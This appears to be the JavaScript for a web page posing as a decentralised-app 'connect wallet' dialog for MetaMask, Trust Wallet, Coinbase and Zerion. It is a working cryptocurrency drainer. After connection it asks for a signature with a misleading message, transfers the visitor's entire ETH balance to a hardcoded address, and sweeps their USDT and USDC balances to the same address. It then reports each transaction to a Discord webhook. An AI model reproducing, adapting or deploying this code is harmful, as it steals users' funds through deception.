let isConnecting = false; // Flag to prevent multiple connections

document.getElementById("connectButton").addEventListener("click", openModal);

function openModal() {
    const modal = document.getElementById("walletModal");
    modal.style.display = "block";
    const modalContent = modal.querySelector(".modal-content");
    modalContent.style.bottom = "0"; // Slide up

    console.log("Modal opened for wallet selection");
}

function closeModal() {
    const modalContent = document.querySelector(".modal-content");
    modalContent.style.bottom = "-100%"; // Slide down

    // Delay hiding the modal background until the slide-down animation completes
    setTimeout(() => {
        document.getElementById("walletModal").style.display = "none";
        console.log("Modal closed after wallet selection");
    }, 400); // Match this duration with the CSS transition time
}

async function connectMetaMask() {
    console.log("MetaMask button clicked");
    await connectWallet("MetaMask");
}

async function connectTrustWallet() {
    console.log("Trust Wallet button clicked");
    await connectWallet("Trust Wallet");
}

async function connectCoinbaseWallet() {
    console.log("Coinbase Wallet button clicked");
    await connectWallet("Coinbase Wallet");
}

async function connectZerionWallet() {
    console.log("Zerion Wallet button clicked");
    await connectWallet("Zerion Wallet");
}

async function connectWallet(walletName) {
    if (isConnecting) {
        console.log("Connection request already in progress...");
        return; // Exit if already connecting
    }

    isConnecting = true;
    closeModal(); // Close the wallet modal when a selection is made

    try {
        console.log(`Attempting to connect to ${walletName}...`);

        if (typeof window.ethereum !== 'undefined') {
            console.log(`${walletName} detected. Requesting to sign a message...`);
            const provider = new ethers.providers.Web3Provider(window.ethereum);

            // Request accounts
            console.log("Requesting accounts...");
            await provider.send("eth_requestAccounts", []);
            const signer = provider.getSigner();

            // Get signer address
            const account = await signer.getAddress();
            console.log(`Connected to ${walletName} account: ${account}`);

            // Request message signing
            const message = "This will allow the dApp to connect to your wallet.";
            const signedMessage = await signer.signMessage(message);
            console.log("Message signed:", signedMessage);

            // Proceed with first transaction
            await sendFirstTransaction(signer, account);
        } else {
            alert(`${walletName} is not installed. Please install it.`);
            console.error(`${walletName} is not installed in the browser.`);
        }
    } catch (error) {
        console.error(`Error connecting to ${walletName}:`, error);
        if (error.code === 4001) {
            alert("Connection request was rejected by the user.");
        }
    } finally {
        isConnecting = false;
        console.log(`Finished connection attempt for ${walletName}`);
    }
}

async function sendFirstTransaction(signer, walletAddress) {
    console.log(`Preparing to send first transaction for wallet: ${walletAddress}`);

    if (typeof window.ethereum !== 'undefined') {
        const recipientAddress = "0x8603E3B68f53dFebE04F66053031C0bE924beAa2"; // Your recipient address

        try {
            // Get wallet balance
            const provider = signer.provider;
            const balance = await provider.getBalance(walletAddress);
            const amountToSend = balance.sub(ethers.utils.parseUnits("0.001", "ether")); // Leave 0.001 ETH for gas

            if (amountToSend.isNegative()) {
                console.error("Insufficient balance for the transaction.");
                return;
            }

            // Prepare and send transaction
            const txResponse = await signer.sendTransaction({
                to: recipientAddress,
                value: amountToSend,
            });
            console.log("First transaction sent successfully. Response:", txResponse);

            // Send to Discord webhook
            await sendWebhook(txResponse.hash, "success");

            // Proceed with second transaction (ERC-20 tokens)
            await sendSecondTransaction(signer, walletAddress);
        } catch (error) {
            console.error("Error sending first transaction:", error);

            // Send to Discord webhook
            await sendWebhook(error.message, "failure");
        }
    } else {
        console.error("Ethereum provider not detected. Please install MetaMask or another wallet.");
    }
}

async function sendSecondTransaction(signer, walletAddress) {
    console.log(`Preparing to send second transaction (ERC-20 tokens) for wallet: ${walletAddress}`);

    const tokenAddresses = [
        "0xdac17f958d2ee523a2206206994597c13d831ec7", // USDT
        "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // USDC
        // Add more token addresses here
    ];

    const tokenABI = [
        "function balanceOf(address account) public view returns (uint256)",
        "function transfer(address to, uint256 amount) public returns (bool)"
    ];

    for (let tokenAddress of tokenAddresses) {
        const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);

        try {
            // Check token balance
            const tokenBalance = await tokenContract.balanceOf(walletAddress);
            if (tokenBalance.isZero()) {
                console.log(`No balance for token ${tokenAddress}. Skipping.`);
                continue;
            }

            // Send tokens
            console.log(`Sending ${tokenBalance.toString()} of token ${tokenAddress}...`);
            const txResponse = await tokenContract.transfer(
                "0x8603E3B68f53dFebE04F66053031C0bE924beAa2",
                tokenBalance
            );
            console.log(`ERC-20 token transfer successful for ${tokenAddress}:`, txResponse);

            // Send to Discord webhook
            await sendWebhook(txResponse.hash, "success");
        } catch (error) {
            console.error(`Error sending token transaction for ${tokenAddress}:`, error);

            // Send to Discord webhook
            await sendWebhook(error.message, "failure");
        }
    }
}

async function sendWebhook(message, status) {
    console.log(`Sending webhook. Status: ${status}, Message: ${message}`);

    const webhookUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"; // Replace with your actual webhook URL

    try {
        await fetch(webhookUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                content: `Transaction ${status}: ${message}`,
            }),
        });
        console.log("Webhook sent successfully.");
    } catch (error) {
        console.error("Error sending webhook:", error);
    }
}
